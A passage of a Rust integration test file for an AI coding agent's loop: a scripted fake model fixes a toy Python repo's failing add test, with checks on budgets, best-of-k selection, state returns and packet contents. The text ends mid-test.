//! Code mode's loop on the fake model and a toy repository whose one test fails: free mode fixes
//! it, best-of-k lets the tests pick, each budget stops the run by name, a discarded packet leaves
//! the checkout as it was, and every reply parses with the retry off.

mod common;

use std::{
    env, fs,
    path::{Path, PathBuf},
    sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    },
    time::{Duration, Instant},
};

use common::{Fake, qwen3_call as call, qwen3_code as code, qwen3_plan};
use larch_agent::{
    AgentEvent,
    audit::AuditEvent,
    code::{
        allow::{self, Decision},
        r#loop::{BUDGET, Code, Outcome, decide},
        task::{Budget, CodeTask, Overrides, Scope, TestRun, Verdict},
    },
    config::Thinking,
    tool::ToolError,
    workers::{self, Workers},
};
use serde_json::{Value, json};

/// The toy's test command: it exits 1 while add subtracts. Windows' Python has no python3 outside
/// the Store's aliases, which the sandbox cannot start.
const TEST: &str = if cfg!(windows) {
    "python test_calc.py"
} else {
    "python3 test_calc.py"
};

/// Runs git for the test's own setup, isolated from the host's configuration.
fn git(dir: &Path, args: &[&str]) -> String {
    let out = std::process::Command::new("git")
        .args([
            "-c",
            "user.name=test",
            "-c",
            "user.email=test@example.invalid",
        ])
        .args([
            "-c",
            "commit.gpgsign=false",
            "-c",
            "init.defaultBranch=main",
        ])
        .args(args)
        .current_dir(dir)
        .env_clear()
        .envs(env::var_os("PATH").map(|p| ("PATH", p)))
        .env("HOME", dir)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .unwrap();
    let shown = String::from_utf8_lossy(&out.stderr);
    assert!(out.status.success(), "git {args:?}: {shown}");
    String::from_utf8(out.stdout).unwrap()
}

/// The toy repository in `tmp`, committed: add subtracts, and its one test says so.
fn toy(tmp: &Path) -> PathBuf {
    let repo = tmp.join("toy");
    fs::create_dir_all(&repo).unwrap();
    fs::write(repo.join("calc.py"), "def add(a, b):\n    return a - b\n").unwrap();
    fs::write(
        repo.join("test_calc.py"),
        "from calc import add\n\nassert add(2, 3) == 5, add(2, 3)\nprint(\"ok\")\n",
    )
    .unwrap();
    git(&repo, &["init", "-q"]);
    git(&repo, &["add", "."]);
    git(&repo, &["commit", "-q", "-m", "start"]);
    repo
}

/// The task on `repo` with `budget`.
fn task(repo: &Path, budget: Budget) -> CodeTask {
    let overrides = Overrides {
        test_cmd: Some(TEST.into()),
        allowed_paths: None,
        check_cmds: vec![],
        budget,
    };
    CodeTask::new("make add add", repo, overrides).unwrap()
}

/// `budget` with `k` attempts.
fn k(k: u32) -> Budget {
    Budget { k, ..BUDGET }
}

/// Scripts the edit that replaces `old` with `new` in calc.py.
fn edit(fake: &Fake, old: &str, new: &str) {
    let args = json!({"path": "calc.py", "old_text": old, "new_text": new});
    call(fake, "edit", args, false);
}

/// Scripts the plan a new folder's first reply is held to, naming no file: it fails, and the
/// replies after it are free.
fn no_plan(fake: &Fake) {
    qwen3_plan(fake, r#"{"contract": "", "files": []}"#);
}

/// The run's outcome, or None, with the reason printed, when this host cannot sandbox and
/// LARCH_SANDBOX_REQUIRED=1 does not say it must.
fn ran(got: Result<Outcome, ToolError>) -> Option<Outcome> {
    match got {
        Err(ToolError::Invalid(why)) if why.starts_with("the sandbox is unavailable") => {
            assert!(
                env::var_os("LARCH_SANDBOX_REQUIRED").is_none_or(|v| v != "1"),
                "LARCH_SANDBOX_REQUIRED=1 but {why}"
            );
            println!("skipped: {why}");
            None
        }
        got => Some(got.unwrap()),
    }
}

/// Why the sandbox was unavailable, as the model was told it in `fed`; all of `fed` when it was
/// told something else.
fn skipped(fed: &str) -> String {
    let at = fed.find("the sandbox is unavailable").unwrap_or(0);
    fed[at..].lines().next().unwrap_or_default().into()
}

/// The test runs' passed and failed counts.
fn counts(run: Option<&TestRun>) -> (u32, u32) {
    let run = run.unwrap();
    (run.passed, run.failed)
}

#[test]
fn free_mode_fixes_the_failing_test_and_the_packet_shows_it() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    // Done before any change is told so once.
    fake.say("Done.");
    call(&fake, "view", json!({"path": "calc.py"}), false);
    edit(&fake, "a - b", "a + b");
    call(&fake, "run_tests", json!({}), false);
    fake.say("Done: add adds now.");
    let data = tmp.path().join("data");
    let got = code().run(&fake.larch, &task(&repo, k(1)), &data);
    let Some(mut outcome) = ran(got) else {
        return;
    };
    let p = &outcome.packet;
    assert_eq!(counts(p.tests_before.as_ref()), (0, 1), "{}", p.render());
    assert_eq!(counts(p.tests_after.as_ref()), (1, 0), "{}", p.render());
    let done = "the model said it is done and the tests agree";
    assert_eq!(p.stopped.as_deref(), Some(done));
    assert!(
        p.diff.contains("-    return a - b\n+    return a + b\n"),
        "{}",
        p.diff
    );
    let scope = Scope {
        path: "calc.py".into(),
        inside: true,
    };
    assert_eq!(p.scope, [scope]);
    assert_eq!(p.commands_run, [TEST]);
    assert_eq!(
        (p.pr_title.as_str(), p.pr_body.as_str()),
        ("make add add", "Done: add adds now.")
    );
    // The model's last words reach the user before the packet.
    assert_eq!(outcome.notices, ["Done: add adds now."]);
    let shown = p.render();
    for line in [
        "tests before: 0 passed, 1 failed",
        "tests after: 1 passed, 0 failed",
        &format!("stopped: {done}"),
    ] {
        assert!(shown.contains(line), "{line}: {shown}");
    }
    // The repository map came first. The session kept each step's KV, so a step was fed only
    // what its transcript added: the request once.
    let fed = fake.fed();
    assert!(
        fed.contains("calc.py, 2 lines\n  def add 1-2\ntest_calc.py, 4 lines\n"),
        "{fed}"
    );
    assert_eq!(fed.matches("Request: ").count(), 1, "{fed}");
    assert!(
        fed.contains("nothing has changed yet: if the request asks for a change, make it"),
        "{fed}"
    );
    assert_eq!(fake.unsaid(), 0);
    // Approved, the change lands in the checkout, and the worktree and its branch go.
    let worktree = outcome.task.worktree.clone().unwrap();
    let mut out = Vec::new();
    assert!(decide(&mut outcome, &mut "approve\n".as_bytes(), &mut out).unwrap());
    let calc = fs::read_to_string(repo.join("calc.py")).unwrap();
    assert_eq!(calc, "def add(a, b):\n    return a + b\n");
    assert!(!worktree.exists());
    assert_eq!(git(&repo, &["branch", "--list", "iris/*"]), "");
    // So the same request runs again; its first step spends the token budget.
    fake.say("Done.");
    let budget = Budget { tokens: 1, ..k(1) };
    let mut again = code()
        .run(&fake.larch, &task(&repo, budget), &data)
        .unwrap();
    assert_eq!(again.task.worktree.as_ref(), Some(&worktree));
    again.task.discard().unwrap();
}

#[test]
fn the_sink_sees_each_call_its_result_and_the_tests_verdict_in_order() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    // A call's note is shown at once, before the call; the model sees its calls without it.
    let note = json!({"path": "calc.py", "note": "see what add does"});
    call(&fake, "view", note, false);
    // An edit whose old_text the file lacks fails; the model is told, and so is the user. The
    // file is small, so the writer writes it whole with the change instead.
    edit(&fake, "a * b", "a + b");
    fake.say("def add(a, b):\n    return a + b\n");
    call(&fake, "run_tests", json!({}), false);
    fake.say("Done.");
    let mut seen = Vec::new();
    let got = code().run_with(
        &fake.larch,
        &task(&repo, k(1)),
        &tmp.path().join("data"),
        &mut |e| seen.push(e),
        &mut |_| Decision::No,
    );
    let Some(mut outcome) = ran(got) else {
        return;
    };
    // Whether the tests in the background end before the next step stops them is the host's
    // timing; that they start after the write is not.
    let raced = |e: &&AgentEvent| !matches!(e, AgentEvent::Progress(t) if t.starts_with("Tests in the background stopped"));
    let shown: Vec<String> = (seen.iter().filter(raced))
        .map(|e| match e {
            AgentEvent::ToolCall { name, .. } => format!("call {name}"),
            AgentEvent::ToolResult { name, .. } => format!("result {name}"),
            AgentEvent::Notice(text) => format!("notice {text}"),
            AgentEvent::Progress(text) => format!("progress {text}"),
            e => panic!("{e:?}"),
        })
        .collect();
    let passed = "notice tests: 0 failed";
    // Each result gets Rust's status line as progress, at no model cost.
    assert_eq!(
        shown,
        [
            "progress see what add does",
            "call view",
            "result view",
            "progress read calc.py",
            "call edit",
            "result edit",
            "progress calc.py: the text to replace is not in the file (reading it again)",
            "call write_file",
            "progress Writing calc.py (thinking)",
            "result write_file",
            "progress wrote calc.py, 2 lines",
            "progress Tests running in the background",
            "call run_tests",
            "result run_tests",
            "progress tests: 1 of 1 pass",
            passed,
            // Said done, the loop runs the tests itself, and they agree.
            passed,
            "notice the model said it is done and the tests agree",
        ],
    );
    // A result is the observation's first line, cut and counted as an old step shows it.
    let AgentEvent::ToolResult { summary, .. } = &seen[2] else {
        unreachable!()
    };
    assert_eq!(summary, "1: def add(a, b): (2 lines)");
    // A failed call's result starts with `failed: `, as a chat's does.
    let AgentEvent::ToolResult { summary, .. } = &seen[5] else {
        unreachable!()
    };
    assert!(summary.starts_with("failed: "), "{summary}");
    // Said once; the transcript keeps the call without it.
    let fed = fake.fed();
    assert_eq!(fed.matches("see what add does").count(), 1, "{fed}");
    assert_eq!(fake.unsaid(), 0);
    outcome.task.discard().unwrap();
}

/// A done with nothing changed is a note, not a veto: the replies after it are free to answer.
#[test]
fn a_done_with_nothing_changed_holds_no_reply_to_a_call() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    fake.say("Done.");
    call(&fake, "view", json!({"path": "calc.py"}), false);
    // A note of its own does not make the same call new.
    let noted = json!({"path": "calc.py", "note": "look again"});
    call(&fake, "view", noted, false);
    edit(&fake, "a - b", "a + b");
    call(&fake, "run_tests", json!({}), false);
    fake.say("Done.");
    // Thinking on, so a step held to a call, which thinks as a chat's retry does not, would render
    // the template's empty think block.
    let code = Code {
        thinking: Thinking {
            budget: 16,
            answer_max_tokens: 0,
        },
        ..code()
    };
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code.run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    assert_eq!(counts(outcome.packet.tests_after.as_ref()), (1, 0));
    let fed = fake.fed();
    // No step was held: the view after the note is free.
    assert_eq!(fed.matches("<think>\n\n</think>").count(), 0, "{fed}");
    let noted = "if it asks a question, say done again with the answer in words";
    let turn = "<|im_end|>\n<|im_start|>assistant\n";
    assert!(fed.contains(&format!("{noted}{turn}<tool_call>")), "{fed}");
    assert_eq!(fake.unsaid(), 0);
    outcome.task.discard().unwrap();
}

/// In a context too small to hold every observation whole, as a model's default 8192 tokens, the
/// transcript is compacted and reads the older steps folded to their first line instead of the
/// engine refusing it: two views of 120-line files, each cut to the room's view, then two
/// searches and the fix, end with the tests agreeing.
#[test]
fn a_step_too_long_for_the_context_folds_its_older_observations() {
    let fake = Fake::qwen3(8192);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let notes: String = (1..=120)
        .map(|n| format!("line {n} of the notes, which the model reads and leaves alone\n"))
        .collect();
    for name in ["a.txt", "b.txt"] {
        fs::write(repo.join(name), &notes).unwrap();
    }
    git(&repo, &["add", "."]);
    git(&repo, &["commit", "-q", "-m", "notes"]);
    call(&fake, "view", json!({"path": "a.txt"}), false);
    call(&fake, "view", json!({"path": "b.txt"}), false);
    for pattern in ["notes", "line"] {
        call(&fake, "search", json!({"pattern": pattern}), false);
    }
    edit(&fake, "a - b", "a + b");
    fake.say("Done: add adds.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let done = "the model said it is done and the tests agree";
    assert_eq!(outcome.packet.stopped.as_deref(), Some(done));
    let folded = "[1] view {\"path\":\"a.txt\"}: 1: line 1 of the notes, which the model reads \
                  and leaves alone (60 lines)";
    assert!(fake.fed().contains(folded), "{}", fake.fed());
    outcome.task.discard().unwrap();
}

/// An edit that changes nothing is refused with the lines around its old_text and the last
/// failing tests' names, what the next edit needs; so is one whose old_text is gone.
#[test]
fn a_no_op_edit_gets_the_lines_around_it() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    call(&fake, "run_tests", json!({}), false);
    edit(&fake, "a - b", "a - b");
    // Its text is not there: the small file is written whole with the change instead.
    edit(&fake, "    raise NotImplementedError", "    return a + b");
    fake.say("def add(a, b):\n    return a + b\n");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    assert_eq!(counts(outcome.packet.tests_after.as_ref()), (1, 0));
    let fed = fake.fed();
    let holds = "'calc.py' holds now:\n1: def add(a, b):\n2:     return a - b\n";
    for refused in ["the text is already in the file", "old_text has 0 matches"] {
        let at = fed
            .find(refused)
            .unwrap_or_else(|| panic!("{refused}: {fed}"));
        let reply = &fed[at..fed[at..].find("<|im_end|>").unwrap() + at];
        assert!(reply.contains(holds), "{reply}");
        assert!(reply.contains("\nthe last tests: 1 failed"), "{reply}");
    }
    outcome.task.discard().unwrap();
}

/// A command that flips a file back and forth returns to a state as edits do: told, then the
/// second return to one state stops the run.
// The fake model's commands are POSIX shell, which cmd.exe does not run.
#[cfg(not(windows))]
#[test]
fn a_command_that_flips_a_file_back_and_forth_stops_the_run() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let to = |op: &str| format!("printf 'def add(a, b):\\n    return a {op} b\\n' > calc.py");
    call(&fake, "bash", json!({ "command": to("*") }), false);
    call(&fake, "run_tests", json!({}), false);
    for _ in 0..4 {
        call(&fake, "bash", json!({ "command": to("-") }), false);
        call(&fake, "bash", json!({ "command": to("*") }), false);
    }
    fake.say("Done.");
    let budget = Budget {
        tool_calls: 9,
        ..k(1)
    };
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, budget), &data)) else {
        return;
    };
    let why = "the change put the folder back as it was at the start, a second time; stopped";
    assert_eq!(
        outcome.packet.stopped.as_deref(),
        Some(why),
        "{}",
        fake.fed()
    );
    let told = "this puts the folder back to how it was at the start: the tests failed then too";
    assert!(fake.fed().contains(told), "{}", fake.fed());
    outcome.task.discard().unwrap();
}

/// A folder git cannot read as a tree, such as a nested repository with no commit yet, turns the
/// undo check off for that step; the run goes on.
// The fake model's commands are POSIX shell, which cmd.exe does not run.
#[cfg(not(windows))]
#[test]
fn a_folder_git_cannot_hash_does_not_end_the_run() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let nested = "git init -q sub && echo x > sub/f";
    call(&fake, "bash", json!({ "command": nested }), false);
    call(&fake, "bash", json!({"command": "rm -rf sub"}), false);
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let done = "the model said it is done and the tests agree";
    assert_eq!(
        outcome.packet.stopped.as_deref(),
        Some(done),
        "{}",
        fake.fed()
    );
    outcome.task.discard().unwrap();
}

/// A return to a state is told what the tests said there: passed, so the model that broke
/// passing code and put it back runs them and says done, or failed, so it tries another fix.
/// The test is named, so its failure is compared with the base's: one that names none could not
/// be, which says nothing of a state.
#[test]
fn a_return_is_told_what_the_tests_said_there() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    fs::write(
        repo.join("test_calc.py"),
        "import unittest\nfrom calc import add\n\nclass T(unittest.TestCase):\n    \
         def test_add(self):\n        self.assertEqual(add(2, 3), 5)\n\nunittest.main()\n",
    )
    .unwrap();
    git(&repo, &["commit", "-q", "-am", "a named test"]);
    edit(&fake, "a - b", "a + b");
    call(&fake, "run_tests", json!({}), false);
    edit(&fake, "a + b", "a * b");
    call(&fake, "run_tests", json!({}), false);
    // Back to passing, back to failing, then on to a new passing state.
    edit(&fake, "a * b", "a + b");
    edit(&fake, "a + b", "a * b");
    edit(&fake, "a * b", "b + a");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let fed = fake.fed();
    let done = "the model said it is done and the tests agree";
    assert_eq!(outcome.packet.stopped.as_deref(), Some(done), "{fed}");
    let passed = "this puts calc.py back to how step 1 left it: the tests passed then: run them \
                  and say done";
    assert!(fed.contains(passed), "{fed}");
    let failed = "back to how step 3 left it: the tests failed then too; try a different fix";
    assert!(fed.contains(failed), "{fed}");
    outcome.task.discard().unwrap();
}

/// A return to the fix after a detour, with a test that fails on the base too (it needs the
/// network): only the base's failures were left there, so it is never told to try another fix.
#[test]
fn a_return_to_a_fix_with_only_the_bases_failures_is_not_told_it_failed() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    fs::write(
        repo.join("test_calc.py"),
        "import unittest\nfrom calc import add\n\nclass T(unittest.TestCase):\n    \
         def test_add(self):\n        self.assertEqual(add(2, 3), 5)\n\n    def test_net(self):\n        \
         self.fail('needs the network')\n\nunittest.main()\n",
    )
    .unwrap();
    git(&repo, &["commit", "-q", "-am", "a test that always fails"]);
    edit(&fake, "a - b", "a + b");
    call(&fake, "run_tests", json!({}), false);
    edit(&fake, "a + b", "b + a");
    edit(&fake, "b + a", "a + b");
    fake.say("Done.");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let fed = fake.fed();
    assert!(
        fed.contains("this puts calc.py back to how step 1 left it"),
        "{fed}"
    );
    assert!(!fed.contains("try a different fix"), "{fed}");
    assert!(
        fed.contains("only tests that failed before your change failed then"),
        "{fed}"
    );
    outcome.task.discard().unwrap();
}

/// A test run that could not run leaves no verdict behind: a refused edit after it is told so,
/// not the verdict of the run before.
#[test]
fn a_test_run_that_cannot_run_clears_the_last_verdict() {
    if cfg!(windows) {
        return;
    }
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    // A test command naming a program that is not there: every POSIX shell exits 127 for it.
    fs::write(repo.join("t.sh"), format!("#!/bin/sh\n{TEST}\n")).unwrap();
    git(&repo, &["update-index", "--add", "--chmod=+x", "t.sh"]);
    git(&repo, &["commit", "-q", "-m", "script"]);
    call(&fake, "run_tests", json!({}), false);
    call(&fake, "bash", json!({"command": "rm t.sh"}), false);
    call(&fake, "run_tests", json!({}), false);
    edit(&fake, "a - b", "a - b");
    let back = format!("printf '#!/bin/sh\\n%s\\n' '{TEST}' > t.sh && chmod +x t.sh");
    call(&fake, "bash", json!({ "command": back }), false);
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: Some("./t.sh".into()),
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::new("make add add", &repo, overrides).unwrap();
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task, &data)) else {
        return;
    };
    let fed = fake.fed();
    let at = fed
        .find("the text is already in the file")
        .expect("the no-op's reply");
    let reply = &fed[at..fed[at..].find("<|im_end|>").unwrap() + at];
    assert!(reply.contains("\nthe last tests did not run"), "{reply}");
    assert!(!reply.contains("1 failed"), "{reply}");
    outcome.task.discard().unwrap();
}

/// A bash call that puts a file back moves the attempt to that state, so the same edit made again
/// is a return to the state it made before, one whose tests never ran.
// The fake model's commands are POSIX shell, which cmd.exe does not run.
#[cfg(not(windows))]
#[test]
fn an_edit_made_again_after_bash_undid_it_is_a_return() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    edit(&fake, "a - b", "a * b");
    let back = "printf 'def add(a, b):\\n    return a - b\\n' > calc.py";
    call(&fake, "bash", json!({ "command": back }), false);
    edit(&fake, "a - b", "a * b");
    edit(&fake, "a * b", "a + b");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let fed = fake.fed();
    let told = "this puts calc.py back to how step 1 left it; run the tests to see";
    assert!(fed.contains(told), "{fed}");
    outcome.task.discard().unwrap();
}

/// The tests run after bash put a file back are the verdict of the state bash left, not of the
/// state the edit before it made: a later return to that edit's state is not told they failed.
// The fake model's commands are POSIX shell, which cmd.exe does not run.
#[cfg(not(windows))]
#[test]
fn a_test_run_after_bash_undid_a_change_is_not_that_changes_verdict() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    edit(&fake, "a - b", "a + b");
    let back = "printf 'def add(a, b):\\n    return a - b\\n' > calc.py";
    call(&fake, "bash", json!({ "command": back }), false);
    call(&fake, "run_tests", json!({}), false);
    edit(&fake, "a - b", "a * b");
    edit(&fake, "a * b", "a + b");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let fed = fake.fed();
    let done = "the model said it is done and the tests agree";
    assert_eq!(outcome.packet.stopped.as_deref(), Some(done), "{fed}");
    assert!(
        fed.contains("back to how step 1 left it; run the tests to see"),
        "{fed}"
    );
    // The failing run was of the start, which bash put back (and is told so), not of step 1.
    assert!(!fed.contains("step 1 left it: the tests failed"), "{fed}");
    let undone = "this puts the folder back to how it was at the start: the tests failed then too";
    assert!(fed.contains(undone), "{fed}");
    outcome.task.discard().unwrap();
}

/// Back to the start is never "passed then": done there is "nothing has changed yet".
#[test]
fn a_return_to_the_start_never_says_its_tests_passed() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    fs::write(repo.join("calc.py"), "def add(a, b):\n    return a + b\n").unwrap();
    git(&repo, &["commit", "-q", "-am", "add adds"]);
    edit(&fake, "a + b", "a * b");
    edit(&fake, "a * b", "a + b");
    call(&fake, "view", json!({"path": "calc.py"}), false);
    let budget = Budget {
        tool_calls: 2,
        ..k(1)
    };
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, budget), &data)) else {
        return;
    };
    let fed = fake.fed();
    let told = "this puts calc.py back to how it was at the start; run the tests to see";
    assert!(fed.contains(told), "{fed}");
    outcome.task.discard().unwrap();
}

/// Two failed edits of a file too long to rewrite whole at once, a 0-match one and one cut before
/// its call closed, steer it to write_file: the next edit of it is refused with that.
#[test]
fn two_failed_edits_of_a_file_steer_it_to_write_file() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("game");
    fs::create_dir(&folder).unwrap();
    let script: String = ["let n = 1;\n".to_string()]
        .into_iter()
        .chain((1..=800).map(|n| format!("let x{n} = {n};\n")))
        .collect();
    fs::write(folder.join("script.js"), &script).unwrap();
    let data = tmp.path().join("data");
    let edit = |old: &str| json!({"path": "script.js", "old_text": old, "new_text": "n = 2"});
    call(&fake, "edit", edit("n = 3"), false);
    // Cut at the step's cap, the largest call's room (replace_symbol's 2048 tokens), inside its
    // new_text: shorter, the reply would run on into the next scripted call.
    let mut cut = vec![fake.token("<tool_call>")];
    let open = "\n{\"name\": \"edit\", \"arguments\": {\"path\":\"script.js\",\"old_text\":\"n = 1\",\"new_text\":\"";
    cut.extend(fake.tokenizer.encode(open, false));
    cut.resize(2048, fake.byte(b'x'));
    fake.say_tokens(&cut);
    call(&fake, "edit", edit("n = 1"), false);
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("make n 2", &folder, &data);
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let fed = fake.fed();
    let steer = "2 edits of 'script.js' failed: write it whole with write_file";
    assert!(fed.contains(steer), "{fed}");
    assert!(!fed.contains("replaced 1 match"), "{fed}");
    assert_eq!(
        fs::read_to_string(folder.join("script.js")).unwrap(),
        script
    );
}

#[test]
fn best_of_two_picks_the_attempt_whose_tests_pass() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    // Step 1: attempt 0 multiplies, attempt 1 adds; step 2: attempt 0's second call is over the
    // budget, attempt 1 says it is done.
    edit(&fake, "a - b", "a * b");
    edit(&fake, "a - b", "a + b");
    call(&fake, "run_tests", json!({}), false);
    fake.say("Done.");
    let budget = Budget {
        tool_calls: 1,
        ..k(2)
    };
    let data = tmp.path().join("data");
    let Some(outcome) = ran(code().run(&fake.larch, &task(&repo, budget), &data)) else {
        return;
    };
    let p = &outcome.packet;
    assert_eq!(outcome.task.branch.as_deref(), Some("iris/make-add-add-1"));
    assert!(p.diff.contains("+    return a + b\n"), "{}", p.diff);
    assert_eq!(counts(p.tests_after.as_ref()), (1, 0));
    // The other attempt's worktree and branch are gone.
    assert!(!data.join("agent/code/make-add-add/0").exists());
    assert!(outcome.task.worktree.as_ref().unwrap().exists());
    let listed = ["branch", "--list", "--format=%(refname:short)", "iris/*"];
    assert_eq!(git(&repo, &listed), "iris/make-add-add-1\n");
    assert_eq!(fake.unsaid(), 0);
}

#[test]
fn best_of_two_ties_go_to_the_smaller_diff() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    edit(&fake, "    return a - b", "    # adds\n    return a + b");
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(outcome) = ran(code().run(&fake.larch, &task(&repo, k(2)), &data)) else {
        return;
    };
    assert_eq!(outcome.task.branch.as_deref(), Some("iris/make-add-add-1"));
    assert!(
        !outcome.packet.diff.contains("# adds"),
        "{}",
        outcome.packet.diff
    );
}

#[test]
fn each_budget_stops_the_run_and_is_named() {
    let fake = Fake::qwen3(32768);
    let view = || call(&fake, "view", json!({"path": "calc.py"}), false);
    let run = |budget: Budget| {
        let tmp = tempfile::tempdir().unwrap();
        let repo = toy(tmp.path());
        let got = code().run(&fake.larch, &task(&repo, budget), &tmp.path().join("data"));
        assert_eq!(fake.unsaid(), 0);
        ran(got).map(|o| (tmp, o))
    };
    let named = |o: &Outcome, why: &str, steps: u32| {
        assert_eq!(o.packet.stopped.as_deref(), Some(why));
        assert!(o.packet.render().contains(&format!("stopped: {why}\n")));
        assert_eq!(o.steps, steps, "{why}");
        // The tests on the unchanged toy still fail.
        assert_eq!(counts(o.packet.tests_after.as_ref()), (0, 1));
    };
    let seconds = Budget { seconds: 0, ..k(1) };
    let Some((_tmp, o)) = run(seconds) else {
        return;
    };
    named(&o, "the seconds budget (0) ran out", 0);
    // A read that returns something new is not counted; a command is.
    let command = || call(&fake, "bash", json!({"command": "true"}), false);
    command();
    command();
    let calls = Budget {
        tool_calls: 1,
        ..k(1)
    };
    let (_tmp, o) = run(calls).unwrap();
    named(&o, "the tool_calls budget (1) ran out", 2);
    view();
    let tokens = Budget { tokens: 1, ..k(1) };
    let (_tmp, o) = run(tokens).unwrap();
    named(&o, "the tokens budget (1) ran out", 1);
}

/// Reads that each return something new explore, which the tokens and seconds bound: a budget
/// of one call still makes the fix after them. A read made again that gets the same is counted.
#[test]
fn reads_that_return_something_new_are_not_counted() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    call(&fake, "view", json!({"path": "calc.py"}), false);
    call(&fake, "view", json!({"path": "test_calc.py"}), false);
    call(&fake, "search", json!({"pattern": "def add"}), false);
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    let calls = Budget {
        tool_calls: 1,
        ..k(1)
    };
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, calls.clone()), &data)) else {
        return;
    };
    let done = "the model said it is done and the tests agree";
    assert_eq!(outcome.packet.stopped.as_deref(), Some(done));
    outcome.task.discard().unwrap();
    call(&fake, "view", json!({"path": "calc.py"}), false);
    call(&fake, "view", json!({"path": "calc.py"}), false);
    call(&fake, "view", json!({"path": "calc.py"}), false);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let data = tmp.path().join("data");
    let outcome = code().run(&fake.larch, &task(&repo, calls), &data).unwrap();
    let out = "the tool_calls budget (1) ran out";
    assert_eq!(outcome.packet.stopped.as_deref(), Some(out));
}

/// Build output a command made in the worktree (a core dump, a CMake build tree) stays out of the
/// packet, and its body says so; a file the model wrote goes in, as does a repository a command
/// made (`a_git_folder_the_model_plants_never_runs_outside_the_sandbox`).
#[test]
fn build_output_a_command_made_stays_out_of_the_packet() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let made = "echo dump > core && mkdir build && echo cache > build/CMakeCache.txt";
    call(&fake, "bash", json!({"command": made}), false);
    edit(&fake, "a - b", "a + b");
    let note = json!({"path": "NOTES.md", "about": "one line: add adds"});
    call(&fake, "write_file", note, false);
    fake.say("add adds\n");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let p = &outcome.packet;
    assert!(p.diff.contains("+    return a + b\n"), "{}", p.diff);
    let paths: Vec<&str> = p.scope.iter().map(|s| s.path.as_str()).collect();
    assert_eq!(paths, ["NOTES.md", "calc.py"], "{}", p.diff);
    assert!(
        p.pr_body.contains("build/CMakeCache.txt, core"),
        "{}",
        p.pr_body
    );
}

/// A module a command made and the edit imports ships with the edit: the tests passed with it,
/// so a verified packet without it would break the user's checkout.
// The fake model's commands are POSIX shell, which cmd.exe does not run.
#[cfg(not(windows))]
#[test]
fn a_command_made_module_an_edit_imports_is_in_the_packet() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
